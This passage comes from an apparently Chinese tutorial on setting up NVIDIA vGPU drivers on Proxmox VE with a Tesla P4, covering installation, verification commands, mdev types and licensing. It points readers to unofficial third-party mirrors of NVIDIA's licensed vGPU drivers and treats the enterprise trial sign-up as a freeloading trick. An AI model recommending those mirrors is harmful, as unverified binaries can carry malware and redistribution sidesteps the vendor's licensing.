<li>\u200b\u603b\u4e4b\u200b\uff0c\u200b\u4f4e\u8c03\u200b\u4e00\u70b9\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u6211\u4eec\u200b\u662f\u200b\u767d\u200b\u5ad6\u200b\uff0c\u200b\u4e0d\u8981\u200b\u52a0\u88c5\u200b\u81ea\u5df1\u200b\u771f\u7684\u200b\u662f\u200b\u4e2a\u200b\u5927\u200b\u7684\u200b\u4f01\u4e1a\u200b\u7528\u6237\u200b\u5c31\u884c\u200b</li> </ol> <p>\u200b\u6ce8\u518c\u200b\u7533\u8bf7\u200b\u63d0\u4ea4\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5927\u6982\u200b\u9700\u8981\u200b 24-48 \u200b\u5c0f\u65f6\u200b\u7684\u200b\u65f6\u95f4\u200b\uff1a</p> <p> </p> <p>\u200b\u5b9e\u9645\u4e0a\u200b\u6211\u4eec\u200b\u4e0d\u200b\u9700\u8981\u200b\u7b49\u5f85\u200b 24-48 \u200b\u5c0f\u65f6\u200b\uff0c\u200b\u987a\u5229\u200b\u7684\u8bdd\u200b\uff0c1\u200b\u5c0f\u65f6\u200b\u4e0d\u5230\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63a5\u6536\u200b\u5230\u200b NVIDIA \u200b\u7684\u200b\u90ae\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u4e3b\u8981\u200b\u5c31\u662f\u200b\u8fd9\u4e2a\u200b\u300cNVIDIA Set Pasword\u300d\u200b\u90ae\u4ef6\u200b\uff0c  \u200b\u6211\u4eec\u200b\u70b9\u200b\u8fdb\u53bb\u200b\uff0c\u200b\u9009\u62e9\u200b \u300cSET PASSWORD\u300d\u200b\u8bbe\u7f6e\u200b\u8d26\u6237\u200b\u5bc6\u7801\u200b\uff1a</p> <p> </p> <p>URL \u200b\u91cc\u9762\u200b\u4f1a\u200b\u81ea\u5e26\u200b Token \u200b\u8ba4\u8bc1\u200b\uff0c\u200b\u7136\u540e\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbe\u7f6e\u200b\u6211\u4eec\u200b admin@sqlsec.com \u200b\u7684\u200b\u5bc6\u7801\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u4f7f\u7528\u200b\u6211\u4eec\u200b\u7684\u200b\u8d26\u53f7\u200b\u548c\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\uff1aNVIDIA\u200b\u8bb8\u53ef\u200b\u95e8\u6237\u7f51\u7ad9\u200b </p> <p>\u200b\u76f4\u63a5\u200b\u6253\u5f00\u200b\u300cSOFTWARE DOWNLOADS\u300d\u200b\u4e0b\u8f7d\u200b\u9875\u9762\u200b\uff1ahttps://ui.licensing.nvidia.com/software</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u7b5b\u9009\u200b VGPU \u200b\u53d1\u73b0\u200b\u6700\u65b0\u200b\u7684\u200b\u53ea\u6709\u200b vGPU 14.4 \u200b\u7248\u672c\u200b\u7684\u200b\u9a71\u52a8\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8981\u200b\u5410\u200b\u69fd\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u6700\u65b0\u200b\u7684\u200b\u6ca1\u6709\u200b\u76f4\u63a5\u200b\u5c55\u51fa\u200b\u51fa\u6765\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u7b5b\u9009\u200b\u4e00\u4e0b\u200b\u5e73\u53f0\u200b\u4e3a\u200b\u300cLinux KVM\u300d\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u53ef\u200b\u770b\u5230\u200b\u6700\u65b0\u200b\u7684\u200b v15.0 \u200b\u7684\u200b\u9a71\u52a8\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u8fd8\u200b\u6ca1\u200b\u51fa\u73b0\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6211\u4eec\u200b\u518d\u200b\u591a\u200b\u6dfb\u52a0\u200b\u51e0\u4e2a\u200b\u6761\u4ef6\u200b\u7b5b\u9009\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u5b98\u7f51\u200b\u8fd9\u4e2a\u200b\u4e0b\u8f7d\u200b\u9a71\u52a8\u200b\u5305\u200b\u7684\u200b\u94fe\u63a5\u200b\u5e94\u8be5\u200b\u662f\u200b\u5b58\u5728\u200b\u9274\u6743\u200b\u65f6\u95f4\u200b\u7684\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u8d34\u200b\u5230\u200b\u6587\u7ae0\u200b\u91cc\u9762\u200b\u7684\u8bdd\u200b\uff0c\u200b\u540e\u671f\u200b\u94fe\u63a5\u200b\u5931\u6548\u200b\u5c31\u200b\u6709\u200b\u7684\u200b\u6211\u200b\u6539\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u90a3\u200b\u5927\u5bb6\u200b\u65e0\u6cd5\u200b\u6ce8\u518c\u200b\u4f01\u4e1a\u200b\u8d26\u53f7\u200b\u8be5\u200b\u600e\u4e48\u529e\u200b\u5462\u200b\uff1f\u200b\u4e0d\u8981\u200b\u62c5\u5fc3\u200b\uff0c\u200b\u6211\u4eec\u200b\u7ee7\u7eed\u200b\u5f80\u4e0b\u200b\u770b\u200b\u3002</p>"},{"location":"4/5/#_6","title":"\u9a71\u52a8\u200b\u5206\u4eab","text":"<p>\u200b\u6ca1\u6709\u200b\u4f01\u4e1a\u200b\u8d26\u53f7\u200b\u4e5f\u200b\u6ca1\u5173\u7cfb\u200b\uff0c\u200b\u7f51\u4e0a\u200b\u5f88\u591a\u200b\u70ed\u5fc3\u200b\u7f51\u53cb\u200b\u4e5f\u200b\u6709\u200b\u5206\u4eab\u200b\u8fc7\u200b\u9a71\u52a8\u200b\u7684\u200b\u4e0b\u8f7d\u200b\u94fe\u63a5\u200b\uff1a</p> <ul> <li> <p>\u200b\u4f5b\u897f\u200b\u5927\u4f6c\u200b\u7684\u200b\u516c\u5f00\u200b\u7f51\u76d8\u200b\uff1ahttps://foxi.buduanwang.vip/pan/foxi/Virtualization/vGPU/</p> </li> <li> <p>Github \u200b\u7684\u200b vGPU  Driver\uff1ahttps://github.com/VGPU-Community-Drivers/NV-VGPU-Driver/releases</p> </li> <li>\u200b\u67d0\u200b\u4fc4\u7f57\u65af\u200b\u5927\u4f6c\u200b\u7684\u200b\u7f51\u76d8\u200b 15.0 vGPU \u200b\u9a71\u52a8\u200b\uff1ahttps://nextcloud.igit.spb.ru/index.php/s/joPd9YGz65rpLjB?path=%2F</li> <li> <p>\u200b\u56fd\u5149\u200b\u7684\u200b OneDriver  \u200b\u5206\u4eab\u200b\u7684\u200b 15.0 vGPU \u200b\u9a71\u52a8\u200b\uff1aNVIDIA-GRID-Linux-KVM-525.60.12-525.60.13-527.41.zip</p> </li> <li> <p>\u200b\u56fd\u5149\u200b\u7684\u200b\u5ea6\u200b\u7f51\u76d8\u200b\u5206\u4eab\u200b\u7684\u200b 15.0 vGPU \u200b\u9a71\u52a8\u200b\uff1a\u200b\u94fe\u63a5\u200b: https://pan.baidu.com/s/1J72clvi3IyZg-jStue2LJA?pwd=vGPU \u200b\u63d0\u53d6\u200b\u7801\u200b: vGPU</p> </li> </ul>"},{"location":"4/5/#_7","title":"\u9a71\u52a8\u200b\u5b89\u88c5","text":"<p>\u200b\u89e3\u538b\u200b\u5185\u5bb9\u200b\u53ea\u8981\u200b\u5305\u542b\u200b Host \u200b\u4e3b\u673a\u200b\u9a71\u52a8\u200b\u548c\u200b\u5404\u4e2a\u200b\u5e73\u53f0\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u9a71\u52a8\u200b\uff1a</p> <p></p> <p>\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u5c06\u200b Host \u200b\u9a71\u52a8\u200b NVIDIA-Linux-x86_64-525.60.12-vGPU-kvm.run \u200b\u4e0a\u200b\u4f20\u5230\u200b PVE \u200b\u4e0a\u200b\u51c6\u5907\u200b\u5b89\u88c5\u200b\u3002</p> <p>\u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u7684\u200b Tesla P4 \u200b\u662f\u200b\u5b8c\u5168\u200b\u652f\u6301\u200b vGPU \u200b\u7684\u200b\uff1a</p> \u200b\u663e\u5361\u200b\u539f\u751f\u200b\u4e0d\u200b\u652f\u6301\u200b vGPU \uff1f \u200b\u4e0d\u8981\u200b\u614c\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u4f1a\u200b\u51fa\u624b\u200b\uff1a <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u5361\u200b\u4e0d\u200b\u5728\u200b NVIDIA\u00ae Virtual GPU \u200b\u5b98\u65b9\u200b\u5217\u8868\u200b\u4e2d\u200b\u7684\u8bdd\u200b\uff1aNVIDIA\u00ae Virtual GPU Software Supported GPUs\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u4e0b\u56fe\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u4f60\u200b\u7684\u200b\u8bbe\u5907\u200b\u7684\u8bdd\u200b</p> <p> \u200b\u4e5f\u200b\u4e0d\u8981\u200b\u7070\u5fc3\u200b\uff0c\u200b\u53c2\u8003\u200b\u6587\u7ae0\u200b\u4e0b\u9762\u200b\u7684\u200b\u53c2\u8003\u200b\u94fe\u63a5\u200b\uff1aPolloLoco / NVIDIA vGPU Guide  \u200b\u4e5f\u200b\u53ef\u200b\u5b8c\u6210\u200b\u3002</p> <p>\u200b\u5b89\u88c5\u200b\u95e8\u69db\u200b\u5c31\u200b\u964d\u4f4e\u200b\u4e86\u200b\u5f88\u591a\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5b89\u88c5\u200b\uff1a</p> Bash<pre><code>chmod +x NVIDIA-Linux-x86_64-525.60.12-vgpu-kvm.run \n./NVIDIA-Linux-x86_64-525.60.12-vgpu-kvm.run --dkms\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u8fc7\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u63d0\u793a\u200b\u4e86\u200b\u662f\u5426\u200b\u7ee7\u7eed\u200b\u5b89\u88c5\u200b\uff0c\u200b\u6211\u4eec\u200b\u9009\u62e9\u200b\u7ee7\u7eed\u200b\u5b89\u88c5\u200b\u5c31\u884c\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u5f00\u59cb\u200b Build \u200b\u6784\u5efa\u200b\u5185\u6838\u6a21\u5757\u200b\uff0c\u200b\u7b49\u5f85\u200b\u5b8c\u6210\u200b\uff1a</p> <p> </p> \u200b\u89e3\u51b3\u200b\u5b89\u88c5\u200b\u62a5\u9519\u200b\uff1aUnable to load the kernel module 'nvidia.ko' <p>\u200b\u53c2\u8003\u200b\u4e0a\u9762\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6211\u4eec\u200b\u5927\u200b\u6982\u7387\u200b\u4f1a\u200b\u9047\u5230\u200b\u4e0b\u9762\u200b\u56fe\u4e0a\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u62a5\u9519\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8981\u200b\u614c\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u4f1a\u200b\u51fa\u624b\u200b\uff01\u200b\u7ecf\u8fc7\u200b\u591a\u6b21\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b\u548c\u200b vfio.conf \u200b\u6587\u4ef6\u200b\u91cc\u9762\u200b\u7684\u200b\u914d\u7f6e\u200b\u5b58\u5728\u200b\u51b2\u7a81\u200b\uff0c\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u5220\u6389\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code>rm /etc/modprobe.d/vfio.conf\n</code></pre> <p>\u200b\u5982\u679c\u200b\u6784\u5efa\u200b\u6ca1\u200b\u95ee\u9898\u200b\u7684\u8bdd\u200b\uff0c\u200b\u540e\u9762\u200b\u57fa\u672c\u4e0a\u200b\u90fd\u200b\u4f1a\u200b\u6bd4\u8f83\u987a\u5229\u200b\uff0c\u200b\u63a5\u7740\u200b\u5f00\u59cb\u200b\u5b89\u88c5\u200b\u9a71\u52a8\u200b\uff1a </p> <p> </p> <p>\u200b\u9a71\u52a8\u200b\u5b89\u88c5\u200b\u597d\u540e\u200b\uff0c\u200b\u63d0\u793a\u200b\uff1a\u200b\u662f\u5426\u200b\u8981\u200b\u6ce8\u518c\u200b DKMS \u200b\u6a21\u5757\u200b\uff0c\u200b\u90a3\u200b\u80af\u5b9a\u200b\u9009\u62e9\u200b\u300cYes\u300d\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e4b\u540e\u200b\u63d0\u793a\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\uff1a</p> <p> </p> <p>\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u540e\u200b\u91cd\u542f\u200b\u5373\u53ef\u200b\u751f\u6548\u200b\u3002</p>"},{"location":"4/5/#_8","title":"\u9a8c\u8bc1\u200b\u9a71\u52a8","text":"<p>\u200b\u901a\u8fc7\u200b\u68c0\u67e5\u200b\u5185\u6838\u200b\u52a0\u8f7d\u200b\u6a21\u5757\u200b\u5217\u8868\u200b\u4e2d\u200b\u7684\u200b VFIO \u200b\u9a71\u52a8\u7a0b\u5e8f\u200b\u6765\u200b\u9a8c\u8bc1\u200b NVIDIA VGPU \u200b\u8f6f\u4ef6\u5305\u200b\u662f\u5426\u200b\u5df2\u200b\u6b63\u786e\u200b\u5b89\u88c5\u200b\u548c\u200b\u52a0\u8f7d\u200b\uff1a</p> Bash<pre><code>lsmod |grep vfio \n</code></pre> <p> </p> <p>\u200b\u67e5\u770b\u200b\u5e73\u53f0\u200b\u4e2d\u200b\u6240\u6709\u200b NVIDIA GPU\u200b\u7684\u200b\u6982\u89c8\u200b\u4fe1\u606f\u200b\uff1a</p> Bash<pre><code>nvidia-smi\n</code></pre> <p>\u200b\u6b63\u5e38\u200b\u8bc6\u522b\u200b\u5230\u200b\u4e86\u200b\u6211\u4eec\u200b\u7684\u200b Tesla P4 \u200b\u4e0b\u200b\u663e\u5361\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u4e0a\u56fe\u200b\u8fd8\u200b\u663e\u793a\u200b\u4e86\u200b\u6211\u4eec\u200b\u7684\u200b RTX 3060 \u200b\u548c\u200b GT 630 \u200b\u663e\u5361\u200b\uff0c\u200b\u6211\u4eec\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u7cbe\u7b80\u200b\u547d\u4ee4\u200b\u5355\u72ec\u200b\u67e5\u770b\u200b vGPU \u200b\u76f8\u5173\u200b\u7684\u200b\u663e\u5361\u200b\uff1a</p> Bash<pre><code>nvidia-smi vgpu\n</code></pre> <p> </p> <p>\u200b\u67e5\u8be2\u200b\u6211\u4eec\u200b GPU \u200b\u652f\u6301\u200b\u7684\u200b mdev \u200b\u7c7b\u578b\u200b\u5217\u8868\u200b\uff1a</p> Bash<pre><code>ls /sys/class/mdev_bus/*/mdev_supported_types \n</code></pre> <p>\u200b\u4ee5\u53ca\u200b\u8fd9\u4e9b\u200b\u7c7b\u578b\u200b\u53ef\u200b\u652f\u6301\u200b\u7684\u200b vGPU \u200b\u6570\u91cf\u200b\uff1a</p> Bash<pre><code>cat /sys/class/mdev_bus/*/mdev_supported_types/*/available_instances\n</code></pre> <p> </p> <p>\u200b\u4ee5\u4e0a\u200b\u4e24\u4e2a\u200b\u547d\u4ee4\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u4e00\u6761\u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\uff1a</p> Bash<pre><code>mdevctl types\n</code></pre> <p> </p> <p>\u200b\u5176\u5b9e\u200b\u8fd9\u5757\u200b\u5c31\u200b\u6b63\u200b\u5bf9\u5e94\u200b\u7740\u200b PVE Web UI \u200b\u91cc\u9762\u200b\u7684\u200b\u73b0\u5728\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u8868\u662f\u200b\u56fd\u5149\u200b\u6574\u7406\u200b\u7684\u200b\u5bf9\u200b\u8fd9\u200b\u5404\u4e2a\u200bTesla P4 \u200b\u652f\u6301\u200b\u7684\u200b vGPU \u200b\u7684\u200b MDev \u200b\u7c7b\u578b\u200b\u7684\u200b\u89e3\u91ca\u200b\uff08\u200b\u5171\u200b\u652f\u6301\u200b14\u200b\u79cd\u200b\u7c7b\u578b\u200b\uff09\uff1a</p> \u200b\u7c7b\u522b\u200b \u200b\u4ee3\u53f7\u200b \u200b\u6700\u5927\u200b\u5b9e\u4f8b\u200b\u6570\u200b \u200b\u89e3\u91ca\u200b GRID P4-1Q nvidia-63 8 1GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a5120x2880 GRID P4-2Q nvidia-64 4 2GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a7680x4320 GRID P4-4Q nvidia-65 2 4GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a7680x4320 GRID P4-8Q nvidia-66 1 8GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a7680x4320 GRID P4-1A nvidia-67 8 1GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a1280x1084 GRID P4-2A nvidia-68 4 2GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a1280x1084 GRID P4-4A nvidia-69 2 4GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a1280x1084 GRID P4-8A nvidia-70 1 8GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a1280x1084 GRID P4-1B nvidia-71 8 1GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a5120x2880 GRID P4-1B4 nvidia-243 8 \u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\uff0c\u200b\u672a\u6765\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b\u79fb\u9664\u200b GRID P4-2B nvidia-157 4 2GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a5120x2880 GRID P4-2B4 nvidia-214 4 \u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\uff0c\u200b\u672a\u6765\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b\u79fb\u9664\u200b GRID P4-4C nvidia-288 2 4GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a4096x2440 GRID P4-8C nvidia-289 1 1GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u6700\u5927\u200b\u5206\u8fa8\u7387\u200b\u4e3a\u200b\uff1a4096x2440 <p>\u200b\u5176\u4e2d\u200b\u6211\u4eec\u200b\u6ce8\u610f\u200b\u5230\u200b\u4e86\u200b\u7c7b\u4f3c\u200b\u91cc\u9762\u200b\u7684\u200b\uff1a1\u30012\u30014\u30018 \u200b\u8fd9\u200b\u51e0\u4e2a\u200b\u6570\u5b57\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8868\u793a\u200b\u8fd9\u200b vGPU \u200b\u7684\u200b\u663e\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b 1 \u200b\u5f00\u5934\u200b\u7684\u200b\u53ef\u7528\u200b\u6570\u91cf\u200b\u4e3a\u200b 8\uff0c\u200b\u6bd5\u7adf\u200b Tesla \u200b\u53ea\u6709\u200b 8GB \u200b\u663e\u5b58\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fd8\u662f\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u7406\u89e3\u200b\u7684\u200b\u3002\u200b\u80af\u5b9a\u200b\u8fd8\u6709\u200b\u5c0f\u4f19\u4f34\u200b\u597d\u5947\u200b\u8fd9\u4e2a\u200b\uff1aA\u3001B\u3001C\u3001Q \u200b\u662f\u200b\u5565\u610f\u601d\u200b\u5462\u200b\uff1f\u200b\u8fd9\u200b\u5176\u5b9e\u200b\u4ee3\u8868\u200b\u7740\u200b vGPU \u200b\u7684\u200b\u51e0\u4e2a\u200b\u4e0d\u901a\u200b\u7cfb\u5217\u200b\uff0c\u200b\u4e0b\u8868\u662f\u200b NVIDIA \u200b\u5b98\u65b9\u200b PDF \u200b\u91cc\u9762\u200b\u7684\u200b\u89e3\u91ca\u200b\uff1a</p> \u200b\u7cfb\u5217\u200b \u200b\u6700\u5927\u200b\u5e27\u200b\u6570\u200b \u200b\u89e3\u91ca\u200b\u8bf4\u660e\u200b Q 60FPS \u200b\u517c\u987e\u200b Quadro \u200b\u6280\u672f\u200b\u7684\u200b\u6027\u80fd\u200b\u548c\u200b\u7279\u70b9\u200b C 60FPS \u200b\u4e3a\u200b\u8ba1\u7b97\u200b\u5bc6\u96c6\u578b\u200b\u670d\u52a1\u5668\u200b\u63d0\u4f9b\u200b\u9ad8\u6027\u80fd\u200b\u8ba1\u7b97\u200b B 45FPS \u200b\u9762\u5411\u200b\u4e1a\u52a1\u200b\u4e13\u5458\u200b\u548c\u200b\u77e5\u8bc6\u200b\u5de5\u4f5c\u8005\u200b\u63d0\u4f9b\u200b\u865a\u62df\u200b\u684c\u9762\u200b A 60FPS \u200b\u63d0\u4f9b\u200b\u9488\u5bf9\u200b\u865a\u62df\u673a\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u7528\u6237\u200b\u7684\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u6d41\u200b\u7684\u200b\u4f1a\u200b\u8bdd\u200b\u76f8\u5173\u200b\u89e3\u51b3\u65b9\u6848\u200b \u200b\u56fd\u5149\u200b\u5c0f\u200b\u8bfe\u5802\u200b\uff1avGPU \u200b\u8bb8\u53ef\u8bc1\u200b\u76f8\u5173\u200b <p>NVIDIA vGPU \u200b\u9700\u8981\u200b\u8f6f\u4ef6\u200b\u8bb8\u53ef\u8bc1\u200b\u624d\u80fd\u200b\u542f\u7528\u200b Guest \u200b\u6765\u5bbe\u200b VM \u200b\u4e2d\u200b\u7684\u200b\u6240\u6709\u200b vGPU \u200b\u529f\u80fd\u200b\uff0c\u200b\u8bb8\u53ef\u8bc1\u200b\u7c7b\u578b\u200b\u53d6\u51b3\u4e8e\u200b vGPU \u200b\u7c7b\u578b\u200b\u3002</p> <ul> <li>Q \u200b\u7cfb\u5217\u200b vGPU \u200b\u7c7b\u578b\u200b\u9700\u8981\u200b vWS \u200b\u8bb8\u53ef\u8bc1\u200b</li> <li>C \u200b\u7cfb\u5217\u200b\u7684\u200b vGPU \u200b\u7c7b\u578b\u200b\u9700\u8981\u200b NVIDIA \u200b\u865a\u62df\u200b\u8ba1\u7b97\u200b\u670d\u52a1\u5668\u200b vCS \u200b\u8bb8\u53ef\u8bc1\u200b\uff0c\u200b\u4f46\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e0e\u200b vWS \u200b\u8bb8\u53ef\u8bc1\u200b\u4e00\u8d77\u200b\u4f7f\u7528\u200b</li> <li>B \u200b\u7cfb\u5217\u200b vGPU \u200b\u7c7b\u578b\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b vPC \u200b\u8bb8\u53ef\u8bc1\u200b\uff0c\u200b\u4f46\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e0e\u200b vWS \u200b\u8bb8\u53ef\u8bc1\u200b\u4e00\u8d77\u200b\u4f7f\u7528\u200b</li> <li>A \u200b\u7cfb\u5217\u200b vGPU \u200b\u7c7b\u578b\u200b\u9700\u8981\u200b vApps \u200b\u8bb8\u53ef\u8bc1\u200b</li> </ul>"},{"location":"4/5/#vgpu","title":"vGPU \u200b\u6dfb\u52a0","text":"<p>\u200b\u901a\u8fc7\u200b\u4e0a\u9762\u200b\u7684\u200b\u7ae0\u8282\u200b\uff0c\u200b\u6211\u4eec\u200b\u5927\u6982\u200b\u4e86\u89e3\u200b\u5230\u200b\u4e86\u200b  vGPU \u200b\u7684\u200b MDev \u200b\u7c7b\u578b\u200b\uff0c\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u50cf\u200b\u6dfb\u52a0\u200b PCI \u200b\u8bbe\u5907\u200b\u90a3\u6837\u200b\uff0c\u200b\u7ed9\u200b VM \u200b\u6dfb\u52a0\u200b\u5bf9\u5e94\u200b\u7684\u200b MDev \u200b\u7c7b\u578b\u200b\u7684\u200b VGPU \u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u5982\u679c\u200b\u5982\u679c\u200b\u60a8\u200b\u7684\u200b PVE \u200b\u670d\u52a1\u5668\u200b\u7248\u672c\u200b\u4f4e\u4e8e\u200b 7.2-4\uff0c\u200b\u5219\u200b\u8fd8\u200b\u5f97\u200b\u6dfb\u52a0\u200b\u989d\u5916\u200b\u7684\u200b\u53c2\u6570\u200b\u5230\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u624d\u200b\u53ef\u4ee5\u200b\uff1a</p> Bash<pre><code>qm set VMID -args '-uuid &lt;UUID-OF-THE-MDEV&gt;' \n</code></pre> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u5b9e\u9a8c\u200b\u73af\u5883\u200b\u662f\u200b PVE 7.3 \u200b\u7248\u672c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u5c31\u200b\u5c55\u5f00\u200b\u8bf4\u200b\u4e86\u200b\uff0c\u200b\u611f\u5174\u8da3\u200b\u7684\u200b\u7f51\u53cb\u200b\u53ef\u4ee5\u200b\u81ea\u884c\u200b\u53bb\u200b\u8c37\u6b4c\u200b\u4e00\u4e0b\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\u6253\u5f00\u200b\u6211\u4eec\u200b\u7684\u200b VM \u200b\u53d1\u73b0\u200b\u5e76\u200b\u6ca1\u6709\u200b\u8bc6\u522b\u200b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b vGPU \u200b\u663e\u5361\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6ca1\u6709\u200b\u5b89\u88c5\u200b Guest \u200b\u9a71\u52a8\u200b\u7684\u200b\u539f\u56e0\u200b\uff0c\u200b\u6211\u4eec\u200b\u5c06\u200b  527.41_grid_win10_win11_server2019_server2022_dch_64bit_international.exe \u200b\u4f20\u8f93\u200b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b VM \u200b\u91cc\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u7b49\u5f85\u200b\u9a71\u52a8\u200b\u7684\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u5373\u53ef\u200b\uff0c\u200b\u5b89\u88c5\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5df2\u7ecf\u200b\u8bc6\u522b\u200b\u5230\u200b\u4e86\u200b\u6211\u4eec\u200b\u7684\u200b Tesla P4 \u200b\u663e\u5361\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u867d\u7136\u200b\u6211\u4eec\u200b\u7684\u200b P4 \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u53d1\u73b0\u200b\u6211\u4eec\u200b\u7684\u200b Lincense \u200b\u4f9d\u7136\u200b\u662f\u200b\u672a\u6fc0\u6d3b\u200b\u7684\u200b\uff1a</p> Text Only<pre><code>nvidia-smi -q |findstr License\n</code></pre> <p> </p> <p>\u200b\u4f7f\u7528\u200b\u4e00\u6bb5\u200b\u65f6\u5019\u200b Windows \u200b\u53f3\u4e0b\u89d2\u200b\u4e5f\u200b\u4f1a\u200b\u5f39\u7a97\u200b\u63d0\u793a\u200b\uff1aNVIDIA \u200b\u8bb8\u53ef\u8bc1\u200b\u4e0d\u200b\u5b58\u5728\u200b</p> <p> </p> 